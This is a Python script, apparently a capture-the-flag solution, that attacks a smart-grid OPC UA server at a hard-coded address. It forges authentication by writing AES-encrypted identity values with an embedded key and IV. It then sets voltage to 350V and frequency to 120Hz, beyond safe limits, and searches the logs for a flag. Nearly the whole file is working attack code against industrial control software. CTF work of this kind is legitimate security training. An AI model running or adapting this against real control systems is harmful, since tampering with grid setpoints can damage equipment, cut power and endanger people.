from opcua import Client
import logging        
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

# Configure logging
logging.basicConfig(level=logging.WARN)
logger = logging.getLogger(__name__)



def hack_smart_grid():
    """
    Hack into Volnaya's smart grid by bypassing authentication and manipulating grid parameters
    """
    # OPC UA server URL
    opc_url = "opc.tcp://94.237.52.208:31495"
    
    try:
        # Create OPC UA client
        client = Client(opc_url)
        
        # Connect to the server
        logger.info("Connecting to OPC UA server...")
        client.connect()
        
        # Get the root node
        root = client.get_root_node()
        
        # Browse the server structure first
        logger.info("Browsing server structure...")
        objects = root.get_child("0:Objects")
        
        # Access the namespaces directly with the correct namespace indices
        security_ns = objects.get_child("2:Security")
        auth_ns = objects.get_child("3:Authentication")
        diagnostics_ns = objects.get_child("4:Diagnostics")
        grid_ns = objects.get_child("5:Grid")
        
        logger.info("Successfully connected to all namespaces")

        # Step 1: Explore namespaces to understand the mechanism
        # for ns_name, ns_obj in [("Security", security_ns), ("Authentication", auth_ns), ("Diagnostics", diagnostics_ns), ("Grid", grid_ns)]:
        #     logger.info(f"=== {ns_name.upper()} NAMESPACE ===")
        #     for child in ns_obj.get_children():
        #         child_name = child.get_browse_name()
        #         logger.info(f"  {child_name}")
        #         try:
        #             child_value = child.get_value()
        #             logger.info(f"    Value: {child_value}")
        #         except:
        #             logger.info(f"    No direct value")
                    
        #             # Check if it has children
        #             try:
        #                 for grandchild in child.get_children():
        #                     gc_name = grandchild.get_browse_name()
        #                     try:
        #                         gc_value = grandchild.get_value()
        #                         logger.info(f"      {gc_name}: {gc_value}")
        #                     except:
        #                         logger.info(f"      {gc_name}: No value")
        #             except:
        #                 pass
                
        # Step 2: Implement AES encryption for authentication
        logger.info("=== IMPLEMENTING AES AUTHENTICATION ===")

        
        # Get encryption parameters from Security namespace
        key = b'G4imwIZszP6TrcsJ'  # 16 bytes for AES128
        iv = b'owJBi4OeaixebwqO'   # 16 bytes IV
        
        def encrypt_value(plaintext):
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(plaintext.encode('utf-8'), AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            return base64.b64encode(encrypted).decode('utf-8')
        
        # Try to set encrypted authentication values
        try:
            common_name_node = auth_ns.get_child("3:CommonName")
            organization_node = auth_ns.get_child("3:Organization") 
            serial_number_node = auth_ns.get_child("3:SerialNumber")
            
            # Encrypt and set common authentication values
            logger.info("Setting encrypted CommonName...")
            encrypted_cn = encrypt_value("GridCrypOp")
            common_name_node.set_value(encrypted_cn)
            logger.info(f"CommonName set to encrypted value: {encrypted_cn}")
            
            logger.info("Setting encrypted Organization...")
            encrypted_org = encrypt_value("VolnayaOrg")
            organization_node.set_value(encrypted_org)
            logger.info(f"Organization set to encrypted value: {encrypted_org}")
            
            logger.info("Setting encrypted SerialNumber...")
            encrypted_sn = encrypt_value("981337")
            serial_number_node.set_value(encrypted_sn)
            logger.info(f"SerialNumber set to encrypted value: {encrypted_sn}")
            
            # Wait a moment for authentication to process
            import time
            time.sleep(3)
            
            # Check diagnostics for authentication result
            diagnostics_error = diagnostics_ns.get_child("4:ErrorLog").get_value()
            logger.error(f"Error Log: {diagnostics_error}")

            time.sleep(3)
            
        except Exception as e:
            logger.error(f"Failed to set encrypted authentication: {e}")
        
        # Step 3: Explore Grid namespace before modification
        logger.info("=== EXPLORING GRID NAMESPACE (BEFORE) ===")
        logger.info("Grid children:")
        for child in grid_ns.get_children():
            child_name = child.get_browse_name()
            logger.info(f"  {child_name}")
            try:
                child_value = child.get_value()
                logger.info(f"    Current value: {child_value}")
            except:
                logger.info(f"    No direct value")
        
        # Step 4: Manipulate Grid parameters
        logger.info("=== MANIPULATING GRID PARAMETERS ===")
        
        # Set Voltage > 300V
        voltage_node = grid_ns.get_child("5:Voltage")
        logger.info("Setting voltage to 350V...")
        voltage_node.set_value(350.0)
        logger.error(f"Voltage verified: {voltage_node.get_value()}V")
        
        # Set Frequency > 100Hz  
        frequency_node = grid_ns.get_child("5:Frequency")
        logger.info("Setting frequency to 120Hz...")
        frequency_node.set_value(120.0)
        logger.error(f"Frequency verified: {frequency_node.get_value()}Hz")
        
        # Step 5: Check all namespaces for changes/flags
        logger.info("=== CHECKING FOR RESULTS ===")
        
        # Wait for updates
        time.sleep(3)
        
        log_ns = grid_ns.get_child("5:Log")
        logger.error(f'Log namespace: {log_ns.get_browse_name()}')
        logger.error(f'Log value: {log_ns.get_value()}')
        for log_child in log_ns.get_children():
            log_child_name = log_child.get_browse_name()
            try:
                log_child_value = log_child.get_value()
                logger.error(f"  {log_child_name}: {log_child_value}")
                
                # Look for flag-like values
                if isinstance(log_child_value, str) and ("HTB{" in log_child_value or "flag" in log_child_value.lower()):
                    logger.error(f"*** POTENTIAL FLAG FOUND: {log_child_value} ***")
                    
            except:
                pass
        
        logger.error("Grid manipulation completed!")
        
    except Exception as e:
        logger.error(f"Error occurred: {e}")
        import traceback
        traceback.print_exc()
        
    finally:
        # Disconnect from the server
        try:
            client.disconnect()
            logger.info("Disconnected from OPC UA server")
        except:
            pass

if __name__ == "__main__":
    hack_smart_grid()